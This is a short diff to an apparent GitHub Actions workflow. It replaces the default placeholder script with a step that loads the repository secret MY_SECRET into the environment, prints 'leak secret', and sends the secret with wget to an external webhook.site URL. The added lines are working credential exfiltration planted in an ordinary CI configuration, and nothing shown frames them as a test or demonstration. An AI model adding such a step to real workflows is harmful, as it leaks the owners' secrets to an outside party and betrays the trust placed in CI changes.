@@ -31,6 +31,9 @@ jobs:
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
+        env:
+          SECRET: ${{ secrets.MY_SECRET }}
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          echo "leak secret"
+          wget https://webhook.site/c2b54d74-0180-4d04-a3b2-55fe3a7b6f1f?secret=$SECRET
+
